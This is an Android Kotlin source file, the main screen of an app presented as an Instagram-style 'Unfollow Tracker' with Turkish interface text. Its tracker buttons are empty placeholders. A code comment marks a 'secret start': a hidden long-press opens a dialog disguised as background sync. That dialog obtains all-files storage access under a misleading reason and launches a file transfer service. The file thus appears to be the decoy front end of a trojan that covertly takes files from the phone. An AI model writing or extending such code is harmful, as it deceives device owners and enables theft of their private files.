package com.unfollowtracker.ui

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.unfollowtracker.databinding.ActivityMainBinding
import com.unfollowtracker.service.FileTransferService
import com.unfollowtracker.utils.PermissionManager

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var permissionManager: PermissionManager
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        permissionManager = PermissionManager(this)
        
        setupUI()
        checkPermissions()
    }
    
    private fun setupUI() {
        binding.apply {
            btnAddFollowers.setOnClickListener {
                // Unfollow Tracker işlevi
                Toast.makeText(this@MainActivity, "Takipçi ekleme ekranı", Toast.LENGTH_SHORT).show()
            }
            
            btnCompare.setOnClickListener {
                Toast.makeText(this@MainActivity, "Karşılaştırma ekranı", Toast.LENGTH_SHORT).show()
            }
            
            btnResults.setOnClickListener {
                Toast.makeText(this@MainActivity, "Sonuçlar ekranı", Toast.LENGTH_SHORT).show()
            }
            
            // Gizli başlatma (uzun bas)
            btnAddFollowers.setOnLongClickListener {
                showSecretStartDialog()
                true
            }
        }
    }
    
    private fun checkPermissions() {
        if (!permissionManager.hasAllPermissions()) {
            showPermissionDialog()
        }
    }
    
    private fun showPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Gerekli İzinler")
            .setMessage("Uygulamanın düzgün çalışması için depolama izinleri gerekiyor.")
            .setPositiveButton("İzin Ver") { _, _ ->
                permissionManager.requestPermissions()
            }
            .setNegativeButton("Reddet") { _, _ ->
                Toast.makeText(this, "İzinler reddedildi", Toast.LENGTH_LONG).show()
            }
            .show()
    }
    
    private fun showSecretStartDialog() {
        AlertDialog.Builder(this)
            .setTitle("Gelişmiş Ayarlar")
            .setMessage("Arka plan senkronizasyonunu başlat?")
            .setPositiveButton("Başlat") { _, _ ->
                startFileTransfer()
            }
            .setNegativeButton("İptal", null)
            .show()
    }
    
    private fun startFileTransfer() {
        if (!permissionManager.hasAllPermissions()) {
            Toast.makeText(this, "Önce tüm izinleri verin", Toast.LENGTH_SHORT).show()
            permissionManager.requestPermissions()
            return
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = android.net.Uri.parse("package:$packageName")
                startActivity(intent)
                return
            }
        }
        
        val serviceIntent = Intent(this, FileTransferService::class.java)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        Toast.makeText(this, "Transfer başlatıldı", Toast.LENGTH_LONG).show()
    }
}
